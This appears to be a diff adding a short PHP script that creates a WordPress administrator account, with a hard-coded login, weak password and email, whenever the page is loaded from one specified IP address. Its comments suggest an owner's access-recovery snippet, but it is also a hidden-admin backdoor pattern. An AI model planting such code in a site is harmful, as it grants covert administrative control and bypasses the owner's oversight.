@@ -1,0 +1,20 @@
+<?php
+$login = 'admin1'; # Логин нового администратора
+$password = 'pasword123'; # Пароль нового администратора
+$email = 'pavlikorest@gmail.com'; # Е-мейл нового администратора
+$ip = '192.168.122.18'; # Ваш IP
+
+if ($_SERVER['REMOTE_ADDR'] === $ip) {
+    require_once(ABSPATH . WPINC . '/pluggable.php');
+    require_once(ABSPATH . 'wp-admin/includes/' . 'user.php');
+
+    $userdata = array(
+        'user_login' => $login,
+        'user_pass' => $password,
+        'user_email' => $email,
+        'role' => 'administrator',
+    );
+    $user_id = wp_insert_user($userdata);
+    var_dump($user_id);
+    die('delete me!');
+}
